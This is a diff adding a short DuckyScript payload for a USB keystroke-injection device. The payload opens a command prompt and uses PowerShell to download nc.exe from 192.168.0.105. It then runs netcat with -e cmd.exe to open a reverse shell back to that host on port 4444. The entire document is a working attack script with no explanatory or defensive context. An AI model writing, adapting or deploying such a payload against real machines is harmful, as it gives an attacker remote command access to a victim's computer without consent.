@@ -1,0 +1,13 @@
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 500
+STRING cd C:\Temp
+ENTER
+DELAY 500
+STRING powershell -Command "(New-Object System.Net.WebClient).DownloadFile('http://192.168.0.105/nc.exe', 'C:\Temp\nc.exe')"
+ENTER
+DELAY 2000
+STRING nc.exe 192.168.0.105 4444 -e cmd.exe
+ENTER
